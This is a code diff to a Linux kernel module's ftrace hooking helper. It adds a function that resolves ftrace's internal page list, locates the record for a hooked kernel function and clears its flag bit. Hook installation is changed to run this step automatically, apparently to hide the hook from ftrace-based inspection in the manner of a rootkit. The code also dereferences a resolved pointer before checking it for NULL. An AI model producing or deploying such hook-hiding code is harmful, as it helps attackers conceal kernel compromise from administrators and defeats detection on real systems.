@@ -40,6 +40,19 @@ notrace int fh_resolve_hook_address(struct ftrace_hook *hook)
     return 0;
 }
 
+
+notrace struct ftrace_page* fh_resolve_ftrace_pages_start(void)
+{
+    struct ftrace_page *ftrace_pages_start;
+
+    ftrace_pages_start = (struct ftrace_page *)resolve_sym("ftrace_pages_start");
+
+    if (!ftrace_pages_start)
+        pr_debug("ftrace_helper: unresolved symbol: ftrace_pages_start\n");
+
+    return ftrace_pages_start;
+}
+
 void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                              struct ftrace_ops *ops, struct pt_regs *regs)
 {
@@ -50,6 +63,27 @@ void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
     if (!within_module(parent_ip, THIS_MODULE))
         regs->ip = (unsigned long)hook->function;
 #endif
+}
+
+notrace int fh_hide_hook(struct ftrace_hook *hook)
+{
+    struct dyn_ftrace *rec;
+    struct ftrace_page *page =
+	(struct ftrace_page *)READ_ONCE(*(unsigned long *)fh_resolve_ftrace_pages_start());
+    if (!page)
+	return -ENOENT;
+    while (page) {
+	for (int i = 0; i < page->index; i++) {
+	    rec = &page->records[i];
+	    if (rec->ip == hook->address)
+	    {
+		rec->flags &= ~1U;
+		return 0;
+	    }
+	}
+	page = page->next;
+    }
+    return 0;
 }
 
 notrace int fh_install_hook(struct ftrace_hook *hook)
@@ -68,8 +102,14 @@ notrace int fh_install_hook(struct ftrace_hook *hook)
         return err;
     }
     err = register_ftrace_function(&hook->ops);
-    if (err)
+    if (err) {
         pr_debug("ftrace_helper: register_ftrace_function() failed: %d\n", err);
+        return err;
+    }
+
+    err = fh_hide_hook(hook);
+    if (err)
+        pr_debug("ftrace_helper: fh_hide_hook() failed: %d\n", err);
 
     return err;
 }
